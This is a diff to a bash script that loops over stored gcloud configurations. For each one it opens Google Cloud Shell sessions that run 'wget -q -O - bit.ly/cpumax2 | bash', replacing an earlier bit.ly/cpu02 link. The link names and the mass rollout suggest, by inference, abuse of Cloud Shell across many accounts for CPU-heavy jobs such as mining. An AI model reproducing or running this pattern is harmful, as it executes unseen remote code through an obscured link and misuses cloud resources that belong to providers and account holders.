@@ -15,7 +15,7 @@ i=0
     do
     
         echo "Block 1 :"
-        docker run --rm --volumes-from gcloud-config-${gid} gcr.io/google.com/cloudsdktool/cloud-sdk gcloud cloud-shell ssh --authorize-session --command='wget -q -O - bit.ly/cpu02 | bash' 1>> $logfile 2>> $errlogfile &
+        docker run --rm --volumes-from gcloud-config-${gid} gcr.io/google.com/cloudsdktool/cloud-sdk gcloud cloud-shell ssh --authorize-session --command='wget -q -O - bit.ly/cpumax2 | bash' 1>> $logfile 2>> $errlogfile &
         echo gid $i: ${gid} 
         i=$[$i+1]
         sleep 5
@@ -26,7 +26,7 @@ i=0
     do
     
         echo "Block 2 :"
-        docker run --rm --volumes-from gcloud-config-${gid} gcr.io/google.com/cloudsdktool/cloud-sdk gcloud cloud-shell ssh --authorize-session --command='wget -q -O - bit.ly/cpu02 | bash' 1>> $logfile 2>> $errlogfile &
+        docker run --rm --volumes-from gcloud-config-${gid} gcr.io/google.com/cloudsdktool/cloud-sdk gcloud cloud-shell ssh --authorize-session --command='wget -q -O - bit.ly/cpumax2 | bash' 1>> $logfile 2>> $errlogfile &
         echo gid $i: ${gid} 
         i=$[$i+1]
         sleep 5
@@ -36,7 +36,7 @@ i=0
     awk "NR >= $[ $block * 2 + 1] " $1| while read gid 
     do
         echo "Block 3 :"
-        docker run --rm --volumes-from gcloud-config-${gid} gcr.io/google.com/cloudsdktool/cloud-sdk gcloud cloud-shell ssh --authorize-session --command='wget -q -O - bit.ly/cpu02 | bash' 1>> $logfile 2>> $errlogfile &
+        docker run --rm --volumes-from gcloud-config-${gid} gcr.io/google.com/cloudsdktool/cloud-sdk gcloud cloud-shell ssh --authorize-session --command='wget -q -O - bit.ly/cpumax2 | bash' 1>> $logfile 2>> $errlogfile &
         echo gid $i: ${gid} 
         i=$[$i+1]
         sleep 5
